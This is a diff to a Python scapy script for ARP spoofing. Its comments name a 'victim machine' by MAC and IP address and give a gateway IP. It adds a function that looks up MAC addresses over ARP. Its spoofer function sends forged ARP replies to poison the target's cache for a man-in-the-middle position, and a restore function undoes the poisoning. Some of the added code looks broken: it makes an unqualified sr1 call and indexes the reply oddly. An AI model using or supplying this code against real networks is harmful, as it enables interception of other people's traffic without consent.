@@ -5,19 +5,18 @@ import time
 import argparse
 import sys
 
-destinationMac = '00-FF-6E-31-C0-F4'
-targetIP = '192.168.1.209'
-gatewayIP = '192.168.1.1'
-sourceMAC = '34-C9-3D-18-2E-EB'
+destinationMac = 'CC-B0-DA-AA-0B-D5' #is Mac address of victim machine
+targetIP = '172.16.7.153' #is Ip address of victim machine
+gatewayIP = '172.16.255.254' #is gatewayIP
+sourceMAC = '34-C9-3D-18-2E-EB' #
 
-def getMac():
-    pass
+def getMac(destinationIP):
+    p = sr1(scapy.ARP(op=scapy.ARP.who_has, psrc="192.168.5.51", pdst=destinationIP))
+    return p[scapy.hwsrc]
 
 def spoofer(targetIP, spoofIP):
     packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
     scapy.send(packet, verbose=False)
-
-
 
 def restore(destinationIP, sourceIP):
     packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
